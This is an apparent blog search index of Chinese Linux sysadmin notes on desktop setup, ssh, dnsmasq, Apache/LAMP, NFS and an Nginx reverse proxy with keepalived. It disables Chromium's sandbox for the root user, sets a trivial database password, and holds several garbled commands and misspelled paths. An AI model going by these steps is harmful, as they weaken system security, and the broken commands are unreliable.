        <content type="html"><![CDATA[<h1 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h1><h2 id="改主机名"><a href="#改主机名" class="headerlink" title="改主机名"></a>改主机名</h2><pre class=" language-shell"><code class="language-shell">hostnamectl set-hostname centos901#主机名改为centos901</code></pre><h2 id="安装搜狗输入法"><a href="#安装搜狗输入法" class="headerlink" title="安装搜狗输入法"></a>安装搜狗输入法</h2><p><a href="https://pinyin.sogou.com/linux/?r=pinyin">https://pinyin.sogou.com/linux/?r=pinyin</a></p><pre class=" language-shell"><code class="language-shell">dpkg -i sougo*.deb</code></pre><p> 第一次应该会报错，原因是缺少依赖</p><pre class=" language-shell"><code class="language-shell">apt install -finit 6</code></pre><p>重启后用Ctrl+空格</p><h2 id="安装wps"><a href="#安装wps" class="headerlink" title="安装wps"></a>安装wps</h2><p><a href="https://linux.wps.cn/">https://linux.wps.cn/</a></p><pre class=" language-shell"><code class="language-shell">dpkg -i wps*.deb</code></pre><h2 id="安装-chromium-浏览器"><a href="#安装-chromium-浏览器" class="headerlink" title="安装 chromium 浏览器"></a>安装 chromium 浏览器</h2><pre class=" language-shell"><code class="language-shell">apt-get install chromium</code></pre><p>之后打开时提醒因为是root账户需要加上 –no-sanbox</p><pre class=" language-shell"><code class="language-shell">vi /usr/share/applications/chromium.desktop</code></pre><p>把Exec一行改为</p><pre class=" language-shell"><code class="language-shell">Exec=/usr/bin/chromium --no-sandbox %U</code></pre><p>之后用图标打开就可以了，这一行的目的是点击图标时执行命令时自动加上 –no-sandbox</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux常用配置文件</title>
      <link href="/0716linux-chang-yong-pei-zhi-wen-jian/"/>
      <url>/0716linux-chang-yong-pei-zhi-wen-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="常用配置文件"><a href="#常用配置文件" class="headerlink" title="常用配置文件"></a>常用配置文件</h1><pre class=" language-shell"><code class="language-shell">/etc/passwd#用户名，shell类型/etc/shadow#用户名，加密过的密码/etc/group#组名/etc/sudoers#配置sudo</code></pre><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务状态</title>
      <link href="/0716-fu-wu-zhuang-tai/"/>
      <url>/0716-fu-wu-zhuang-tai/</url>
      
        <content type="html"><![CDATA[<h1 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h1><pre class=" language-shell"><code class="language-shell">systemctl start [服务名]#开启服务systemctl stop [服务名]#关闭服务systemctl status [服务名]#查看服务的状态systemctl enable [服务名]#设置开机自动起systemctl disable [服务名]#关闭开机自动起systemctl restart [服务名]#重启服务</code></pre><p>&#96;</p>]]></content>
      
      
      
        <tags>
            
            <tag> 服务 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh服务</title>
      <link href="/0716ssh-fu-wu/"/>
      <url>/0716ssh-fu-wu/</url>
      
        <content type="html"><![CDATA[<h2 id="ssh服务"><a href="#ssh服务" class="headerlink" title="ssh服务"></a>ssh服务</h2><p>ssh客户端</p><p>sshd服务端</p><h3 id="拷贝文件"><a href="#拷贝文件" class="headerlink" title="拷贝文件"></a>拷贝文件</h3><pre class=" language-shell"><code class="language-shell">scp 1.txt root@centos:/tmp#从客户端拷贝1.txt到服务器端的/tmp目录scp root@centos:/tmp/a.txt /root#拷贝服务器端的/tmp/a.txt到客户端的/root目录</code></pre><h3 id="配置密钥登录"><a href="#配置密钥登录" class="headerlink" title="配置密钥登录"></a>配置密钥登录</h3><pre class=" language-shell"><code class="language-shell">ssh-keygen#在客户端生成公/私钥ssh-copy-id root@centos#把客户端生成的公钥拷贝到服务器ssh root@centos#登录服务器</code></pre><p>ssh-kengen生成的公私钥保存在&#x2F;root&#x2F;.ssh目录</p><p>其中：</p><pre class=" language-shell"><code class="language-shell">  id_rsa        #私钥  id_rsa.pub    #公钥</code></pre><h3 id="相关文件"><a href="#相关文件" class="headerlink" title="相关文件"></a>相关文件</h3><pre class=" language-shell"><code class="language-shell">/etc/ssh/sshd_config#ssh服务的配置文件/var/log/secure#ssh服务的日志信息</code></pre><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      
      
      
        <tags>
            
            <tag> 服务 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNSmasq服务</title>
      <link href="/0716dnsmasq-fu-wu/"/>
      <url>/0716dnsmasq-fu-wu/</url>
      
        <content type="html"><![CDATA[<h2 id="DNSmasq服务"><a href="#DNSmasq服务" class="headerlink" title="DNSmasq服务"></a>DNSmasq服务</h2><p>提供dns解析服务</p><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>客户端–&gt;dns服务器–&gt;查服务器本地host文件(&#x2F;etc&#x2F;hosts)</p><p>​  –&gt;[如果host里面没有]往上找，找大哥(&#x2F;etc&#x2F;resolv.conf)</p><h3 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h3><p>默认没有开日志</p><p>打开配置文件(&#x2F;etc&#x2F;dnsmasq.cof)</p><pre class=" language-shell"><code class="language-shell">log-queries#默认没有打开，打开log-facility=/var/log/dnsmasq.log#自定义日志目录systemctl -restart#重启服务</code></pre><h3 id="相关文件"><a href="#相关文件" class="headerlink" title="相关文件"></a>相关文件</h3><pre class=" language-shell"><code class="language-shell">/etc/dnsmasq.conf    #主配置文件/etc/hosts           #本地映射文件（本地hosts文件）/etc/resolv.conf     #域名配置文件(大哥)/var/log/dnsmasq.log #日志文件（自定义的日志目录）</code></pre><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      
      
      
        <tags>
            
            <tag> 服务 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache服务</title>
      <link href="/0716apache-fu-wu/"/>
      <url>/0716apache-fu-wu/</url>
      
        <content type="html"><![CDATA[<h2 id="Apache服务"><a href="#Apache服务" class="headerlink" title="Apache服务"></a>Apache服务</h2><h3 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h3><pre class=" language-shell"><code class="language-shell">dnf install httpd</code></pre><h3 id="相关文件"><a href="#相关文件" class="headerlink" title="相关文件"></a>相关文件</h3><pre class=" language-shell"><code class="language-shell">/etc/httpd/conf/httpd.conf   #apache的主配置文件/etc/httpd/                  #apache配置文件的目录/var/www/html                #apache默认存放网页的目录</code></pre><p>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf基本配置</p><pre class=" language-shell"><code class="language-shell">Listen 80                                 #定义Apache的端口User apache                               #定义启动用户Group apache                              #定义启动用户组DocumentRoot "/var/www/html"              #定义网页目录DirectoryIndex index.html                 #定义默认首页文件</code></pre><h3 id="一个ip一个端口不同主机头对应的不同两个（多个类似）网站"><a href="#一个ip一个端口不同主机头对应的不同两个（多个类似）网站" class="headerlink" title="一个ip一个端口不同主机头对应的不同两个（多个类似）网站"></a>一个ip一个端口不同主机头对应的不同两个（多个类似）网站</h3><p>在&#x2F;etc&#x2F;httpd&#x2F;conf.d中建立vhost.conf文件，并写入一下代码(这里建立了$.<em>.com和%.</em>.com)</p><pre><code>&lt;VirtualHost *:80&gt;#绑定的主域ServerName *.com#绑定的子域名ServerAlias $.*.com#网站主目录DocumentRoot /var/www/$#日志配置ErrorLog /var/log/httpd/$_error.logCustomLog /var/log/httpd/$_access.log common#ServerSignature Off&lt;/VirtualHost&gt;#测试一的配置&lt;Directory &quot;/var/www/$/&quot;&gt;    Options FollowSymLinks    AllowOverride All    Require all granted&lt;/Directory&gt;&lt;VirtualHost *:80&gt;#绑定的主域ServerName *.com#绑定的子域名ServerAlias %.*.com#网站主目录DocumentRoot /var/www/%#日志配置ErrorLog /var/log/httpd/%_error.logCustomLog /var/log/httpd/%_access.log common#ServerSignature Off&lt;/VirtualHost&gt;#测试一的配置&lt;Directory &quot;/var/www/%/&quot;&gt;    Options FollowSymLinks    AllowOverride All    Require all granted&lt;/Directory&gt;</code></pre><p>再在&#x2F;etc&#x2F;hosts中加是这两条记录，指向同一个ip即可</p><h3 id="搭建LAMP体系"><a href="#搭建LAMP体系" class="headerlink" title="搭建LAMP体系"></a>搭建LAMP体系</h3><p>L&#x3D;&#x3D;&#x3D;&#x3D;&gt;Linux</p><p>A&#x3D;&#x3D;&#x3D;&#x3D;&gt;Apache</p><p>M&#x3D;&#x3D;&#x3D;&#x3D;&gt;Mysql</p><p>P&#x3D;&#x3D;&#x3D;&#x3D;&gt;Php</p><pre class=" language-shell"><code class="language-shell">dnf -y install httpd httpd-devel#apache及其扩展包</code></pre><pre class=" language-shell"><code class="language-shell">dnf -y install mariadb mariadb-server#安装mariadb及其扩展包systemctl start mariadb#启动服务mysqladmin -u root password 123.com#设置数据库的密码mysql -u root -p#登录数据库</code></pre><pre class=" language-shell"><code class="language-shell">dnf -y install php php-mysqlnd php-gd libjpeg* php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring php-bcmath php-mhash#安装php及其扩展</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 服务 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NFS存储服务</title>
      <link href="/0715nfs-cun-chu-fu-wu/"/>
      <url>/0715nfs-cun-chu-fu-wu/</url>
      
        <content type="html"><![CDATA[<h2 id="NFS存储服务"><a href="#NFS存储服务" class="headerlink" title="NFS存储服务"></a>NFS存储服务</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><pre class=" language-shell"><code class="language-shell">dnf -y install rpcbind nfs-utils</code></pre><p>必须先启动rpcbind再启动nfs</p><pre class=" language-shell"><code class="language-shell">systemctl start rpcbindsystemctl start nfs-server</code></pre><h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><pre class=" language-shell"><code class="language-shell">vi /etc/exportfs#默认是空的</code></pre><pre class=" language-shell"><code class="language-shell">#格式共享的目录  允许的ip(权限)#Eg:/usr 192.168.0.1/24(sync,ro)</code></pre><p>权限：</p><pre class=" language-shell"><code class="language-shell">·  rw：read-write，可读写； ·  ro：read-only，只读；  ·  sync：文件同时写入硬盘和内存；  ·  async：文件暂存于内存，而不是直接写入内存；  ·  no_root_squash：NFS客户端连接服务端时如果使用的是root的话，那么对服务端分享的目录来说，也拥有root权限。  ·  root_squash：NFS客户端连接服务端时如果使用的是root的话，那么对服务端分享的目录来说，拥有匿名用户权限，通常他将使用nobody或nfsnobody身份；  ·  all_squash：不论NFS客户端连接服务端时使用什么用户，对服务端分享的目录来说都是拥有匿名用户权限；  ·  anonuid：匿名用户的UID值，通常是nobody或nfsnobody，可以在此处自行设定；  ·  anongid：匿名用户的GID值。</code></pre><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><h4 id="查看某个服务端共享了哪些目录"><a href="#查看某个服务端共享了哪些目录" class="headerlink" title="查看某个服务端共享了哪些目录"></a>查看某个服务端共享了哪些目录</h4><pre class=" language-shell"><code class="language-shell">showmount -e [服务器ip]#没有showmount可以dnf install nfs-utils</code></pre><h4 id="挂载到本地："><a href="#挂载到本地：" class="headerlink" title="挂载到本地："></a>挂载到本地：</h4><pre class=" language-shell"><code class="language-shell">mount.nfs [服务器ip]:[服务器共享的目录] 挂载到本地的目录#Eg:mount.nfs 192.168.0.103:/usr /mnt/share1</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 服务 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx服务</title>
      <link href="/0715nginx-fu-wu/"/>
      <url>/0715nginx-fu-wu/</url>
      
        <content type="html"><![CDATA[<h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><h3 id="nginx的web-server"><a href="#nginx的web-server" class="headerlink" title="nginx的web server"></a>nginx的web server</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><pre class=" language-shell"><code class="language-shell">dnf -y install nginx</code></pre><h4 id="相关文件"><a href="#相关文件" class="headerlink" title="相关文件"></a>相关文件</h4><pre><code>/etc/nginx/nginx.conf#nginx主配置文件/usr/share/nginx/html/#web server的网页存放目录</code></pre><p>搭建LNMP体系</p><p>N&#x3D;&#x3D;&#x3D;&#x3D;&gt;Nginx</p><pre class=" language-shell"><code class="language-shell">dnf -y install nginx php* mariadb mariadb-server</code></pre><p>和LAMP主要区别是需要安装一个php-fpm的包</p><p>配置php-fpm：</p><pre class=" language-shell"><code class="language-shell">vi /etc/php-fpm.d/www.conf#把配置文件中的用户和用户组从默认的apache改为nginx#启动服务systemctl start php-fpm</code></pre><p>mysql配置同LAMP：</p><pre class=" language-shell"><code class="language-shell">systemctl start mariadb#启动服务mysqladmin -u root password 123.com#设置数据库的密码mysql -u root -p#登录数据库</code></pre><h3 id="nginx的反向代理"><a href="#nginx的反向代理" class="headerlink" title="nginx的反向代理"></a>nginx的反向代理</h3><h4 id="单级别反代"><a href="#单级别反代" class="headerlink" title="单级别反代"></a>单级别反代</h4><p>基本情景</p><p><img src="/0715nginx-fu-wu/image-20220714220531079.png" alt="image-20220714220531079"></p><p>nginx反代的配置</p><pre class=" language-shell"><code class="language-shell">vi /etc/nginx/nginx.conf</code></pre><p>全部删掉，改为：</p><pre class=" language-sh"><code class="language-sh">user nginx;worker_processes auto;error_log /var/log/nginx/error.log;pid /run/nginx.pid;include /usr/share/nginx/modules/*.conf;events &#123;    worker_connections 1024;&#125;http &#123;    log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '                       '$status $body_bytes_sent "$http_referer" '                      '"$http_user_agent" "$http_x_forwarded_for"';    access_log  /var/log/nginx/access.log  main;    sendfile            on;    tcp_nopush          on;    tcp_nodelay         on;    keepalive_timeout   65;    types_hash_max_size 2048;    include             /etc/nginx/mime.types;    default_type        application/octet-stream;    include /etc/nginx/conf.d/*.conf;        include /etc/nginx/default.d/*.conf;upstream web1 &#123;        server 192.168.0.104  weight=1;        #此处填写被代理服务器IP       #server 192.168.0.17  weight=1;       #ip_hash;        &#125;server&#123;        listen 80;        server_name www.wy.com;        access_log  /var/log/nginx/wy.log;#日志目录        location / &#123;            root /home/web1_root;            proxy_pass http://web1;#http://web1 <===> http://192.168.0.104            proxy_read_timeout 300;            proxy_connect_timeout 300;            proxy_redirect     off;            proxy_set_header   X-Forwarded-Proto $scheme;            proxy_set_header   Host              $http_host;            proxy_set_header   X-Real-IP         $remote_addr;            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;        &#125;    &#125;        upstream web2 &#123;        server 192.168.0.1 weight=1;        #此处填写被代理服务器IP       #server 192.168.0.17  weight=1;       #ip_hash;        &#125;server&#123;        listen 80;        server_name www.nxm.com;        access_log  /var/log/nginx/nxm.log;        location / &#123;            root /home/web2_root;            proxy_pass http://web2;            proxy_read_timeout 300;            proxy_connect_timeout 300;            proxy_redirect     off;            proxy_set_header   X-Forwarded-Proto $scheme;            proxy_set_header   Host              $http_host;            proxy_set_header   X-Real-IP         $remote_addr;            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;        &#125;    &#125;&#125;</code></pre><p>主要注意：</p><p><img src="/0715nginx-fu-wu/image-20220714221453442.png" alt="image-20220714221453442"></p><h4 id="进行双层反向代理实验"><a href="#进行双层反向代理实验" class="headerlink" title="进行双层反向代理实验"></a>进行双层反向代理实验</h4><p><img src="/0715nginx-fu-wu/image-20220714223113076.png" alt="image-20220714223113076"></p><h4 id="部署高可用及负载均衡"><a href="#部署高可用及负载均衡" class="headerlink" title="部署高可用及负载均衡"></a>部署高可用及负载均衡</h4><p>避免某一台服务器宕机造成损失</p><h5 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h5><p><img src="/0715nginx-fu-wu/image-20220714230403002.png" alt="image-20220714230403002"></p><h5 id="安装keepalived："><a href="#安装keepalived：" class="headerlink" title="安装keepalived："></a>安装keepalived：</h5><pre class=" language-shell"><code class="language-shell">dnf -y install keepalived#keepalived服务可以的作用是检测服务器的状态</code></pre><p>用上面的例子，192.168.0.103和192.168.0.106是两台反代</p><p>现在做成nginx反代集群</p><p>两台反代的nginx.conf必须保持一致</p><p>编辑keepalived.conf</p><pre class=" language-shell"><code class="language-shell">vi /etc/keepalived/keepalived.conf</code></pre><h6 id="192-168-0-103的conf"><a href="#192-168-0-103的conf" class="headerlink" title="192.168.0.103的conf:"></a>192.168.0.103的conf:</h6><pre class=" language-sh"><code class="language-sh">###keepa.confglobal_defs&#123;    router_id keepalived_91&#125;vrrp_script Monitor_Nginx &#123;    script "/etc/keepalived/monitor_nginx.sh"#判定是否宕机的文件    interval 5    weight 2&#125;vrrp_instance VI_1 &#123;    state MASTER#主    interface ens160#网卡名    virtual_router_id 91    priority 150#优先级    advert_int 1    authentication &#123;        auth_type PASS        auth_pass 1122    &#125;    #VIP    virtual_ipaddress &#123;        192.168.0.44#局域网中不存在的ip    &#125;    track_script &#123;        Monitor_Nginx    &#125;&#125;global_defs&#123;    router_id keepalived_181&#125;vrrp_instance VI_2 &#123;    state BACKUP#从    interface ens160    virtual_router_id 181    priority 100#优先级    advert_int 1    authentication &#123;￼dnf -y install keepalived       #keepalived服务可以的作用是检测服务器的状态        auth_type PASS        auth_pass 2211    &#125;    #VIP    virtual_ipaddress &#123;        192.168.0.144#局域网中不存在的ip    &#125;    track_script &#123;        Monitor_Nginx    &#125;&#125;</code></pre><h6 id="192-168-0-106的conf"><a href="#192-168-0-106的conf" class="headerlink" title="192.168.0.106的conf:"></a>192.168.0.106的conf:</h6><pre class=" language-sh"><code class="language-sh">###keepb.confglobal_defs&#123;    router_id keepalived_91&#125;vrrp_script Monitor_Nginx &#123;    script "/etc/keepalived/monitor_nginx.sh"    interval 5    weight 2&#125;vrrp_instance VI_1 &#123;    state BACKUP    interface ens160    virtual_router_id 91    priority 100    advert_int 1    authentication &#123;        auth_type PASS        auth_pass 1122    &#125;    #VIP    virtual_ipaddress &#123;        192.168.0.44    &#125;    track_script &#123;        Monitor_Nginx    &#125;&#125;global_defs&#123;    router_id keepalived_181&#125;vrrp_instance VI_2 &#123;    state MASTER    interface ens160    virtual_router_id 181    priority 150    advert_int 1    authentication &#123;        auth_type PASS        auth_pass 2211    &#125;    #VIP    virtual_ipaddress &#123;        192.168.0.144    &#125;    track_script &#123;        Monitor_Nginx    &#125;&#125;</code></pre><p>注意：keepalived.conf的内容成镜像，nginx.conf的内容一样</p><h6 id="编辑keepalived判断是否宕机的配置文件："><a href="#编辑keepalived判断是否宕机的配置文件：" class="headerlink" title="编辑keepalived判断是否宕机的配置文件："></a>编辑keepalived判断是否宕机的配置文件：</h6><pre class=" language-shell"><code class="language-shell">vi /etc/keepalived/monitor_nginx.sh#conf中定义的</code></pre><pre class=" language-sh"><code class="language-sh">#!/bin/bashfarmsec=$(ps -C nginx --no-heading|wc -l)if [ "$&#123;farmsec&#125;" = "0" ]; then            systemctl stop keepalivedfi</code></pre><h6 id="dnsmasq配置："><a href="#dnsmasq配置：" class="headerlink" title="dnsmasq配置："></a>dnsmasq配置：</h6><pre class=" language-shell"><code class="language-shell">vi /etc/hosts</code></pre><pre class=" language-sh"><code class="language-sh">192.168.0.44www.wy.com192.168.0.144www.nxm.com192.168.0.44www.nxm.com192.168.0.144www.wy.com</code></pre><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      
      
      
        <tags>
            
            <tag> 服务 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
